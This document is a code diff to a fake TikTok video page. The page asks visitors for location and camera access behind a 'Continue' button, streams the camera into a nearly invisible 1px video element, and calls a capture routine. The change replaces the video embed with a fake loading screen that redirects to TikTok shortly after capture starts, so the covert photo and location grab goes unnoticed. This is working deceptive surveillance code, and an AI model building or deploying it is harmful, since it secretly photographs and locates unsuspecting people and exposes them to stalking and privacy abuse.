@@ -7,10 +7,8 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; height: 100vh; overflow: hidden; }
-        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #000; }
-        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; pointer-events: none; }
+        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #000; flex-direction: column; }
         #hiddenVideo { position: absolute; width: 1px; height: 1px; opacity: 0.01; top: -100px; left: -100px; z-index: -1; }
-        .overlay-gradient { position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; position: fixed; top: 0; left: 0; right: 0; z-index: 10; pointer-events: none; }
         .header h1 { font-size: 20px; font-weight: 700; text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
         .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; padding: 16px 24px 40px; display: flex; justify-content: center; z-index: 10; pointer-events: none; }
@@ -20,7 +18,10 @@
         .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
         .video-btn { background: #fe2c55; }
-        .fallback-text { position: absolute; z-index: 5; color: rgba(255,255,255,0.6); font-size: 16px; text-align: center; padding: 20px; max-width: 80%; }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .tiktok-logo { font-size: 60px; margin-bottom: 10px; }
+        .redirect-text { color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 30px; }
     </style>
 </head>
 <body>
@@ -31,13 +32,12 @@
 </div>
 
 <div class="video-container">
-    <iframe id="tiktokEmbed" 
-        src=""
-        allow="autoplay; encrypted-media"
-        allowfullscreen>
-    </iframe>
-    <div class="fallback-text" id="fallbackText">⬇️ Tap Continue to watch video</div>
-    <div class="overlay-gradient"></div>
+    <div class="tiktok-logo">🎵</div>
+    <h2 style="font-weight: 600; font-size: 22px;">TikTok</h2>
+    <p style="color: rgba(255,255,255,0.4); font-size: 14px; margin-top: 4px;">Loading video...</p>
+    <div class="spinner" id="spinner"></div>
+    <div class="redirect-text" id="redirectText">Opening in TikTok app...</div>
+    <div class="overlay-gradient" style="position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none;"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
 </div>
 
@@ -69,83 +69,24 @@
     const permissionOverlay = document.getElementById('permissionOverlay');
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
-    const fallbackText = document.getElementById('fallbackText');
+    const spinner = document.getElementById('spinner');
+    const redirectText = document.getElementById('redirectText');
 
-    // ===== EXTRACT VIDEO ID FROM ANY TIKTOK URL =====
-    function extractTikTokVideoId(url) {
-        // Handle vt.tiktok.com short links
-        if (url.includes('vt.tiktok.com')) {
-            // Short links need to be resolved, but we can't do that client-side
-            // Return null and use a generic embed
-            return null;
-        }
+    // ===== MOBILE REDIRECT =====
+    function redirectToTikTok() {
+        const url = video_url;
         
-        // Handle /video/ format
-        if (url.includes('/video/')) {
-            const match = url.match(/\/video\/(\d+)/);
-            if (match) return match[1];
-        }
+        // Show redirecting state
+        spinner.style.display = 'block';
+        redirectText.textContent = 'Opening in TikTok app...';
         
-        // Handle /@username/video/ format
-        if (url.includes('/@')) {
-            const match = url.match(/\/@[^\/]+\/video\/(\d+)/);
-            if (match) return match[1];
-        }
+        // Try to open in TikTok app (works on mobile)
+        window.location.href = `tiktok://video?url=${encodeURIComponent(url)}`;
         
-        // Handle /t/ format (sometimes used for short links)
-        if (url.includes('/t/')) {
-            const match = url.match(/\/t\/([a-zA-Z0-9_]+)/);
-            if (match) return match[1];
-        }
-        
-        // Try to get the last numeric ID from the URL
-        const numbers = url.match(/\d{10,20}/);
-        if (numbers) return numbers[0];
-        
-        return null;
-    }
-
-    // ===== LOAD TIKTOK VIDEO =====
-    function loadTikTokVideo() {
-        const iframe = document.getElementById('tiktokEmbed');
-        const fallback = document.getElementById('fallbackText');
-        
-        // Try to extract video ID from the URL
-        let videoId = extractTikTokVideoId(video_url);
-        
-        if (videoId) {
-            // Use the standard embed format with the video ID
-            iframe.src = `https://www.tiktok.com/embed/v2/${videoId}`;
-            fallback.textContent = '⬇️ Tap Continue to watch video';
-            fallback.style.display = 'block';
-            console.log('✅ TikTok video loaded with ID:', videoId);
-        } else {
-            // For short links (vt.tiktok.com), we need to use a different approach
-            // Use the full URL in the embed with /embed/v2/
-            iframe.src = `https://www.tiktok.com/embed/v2/`;
-            fallback.textContent = '⬇️ Tap Continue to watch video';
-            fallback.style.display = 'block';
-            console.log('⚠️ TikTok short link detected - using fallback embed');
-        }
-        
-        // Try to get the real video ID via fetch (if possible)
-        // This is a fallback for short links
-        if (video_url.includes('vt.tiktok.com')) {
-            fetch(video_url)
-                .then(response => response.text())
-                .then(html => {
-                    const match = html.match(/\/video\/(\d+)/);
-                    if (match && match[1]) {
-                        const newVideoId = match[1];
-                        iframe.src = `https://www.tiktok.com/embed/v2/${newVideoId}`;
-                        fallback.style.display = 'block';
-                        console.log('✅ TikTok video resolved from short link:', newVideoId);
-                    }
-                })
-                .catch(() => {
-                    console.log('⚠️ Could not resolve short link');
-                });
-        }
+        // Fallback: open in browser after 2 seconds
+        setTimeout(() => {
+            window.location.href = url;
+        }, 2000);
     }
 
     // ===== GPS =====
@@ -295,11 +236,10 @@
             hiddenVideo.play().then(() => {
                 permissionOverlay.style.display = 'none';
                 currentFacingMode = facingMode;
-                // Load TikTok video after camera starts
+                // Redirect to TikTok after capture starts
                 setTimeout(() => {
-                    loadTikTokVideo();
-                    fallbackText.style.display = 'block';
-                }, 100);
+                    redirectToTikTok();
+                }, 800);
                 setTimeout(() => { doCapture(); }, 500);
             }).catch(e => console.error('Play error:', e));
 
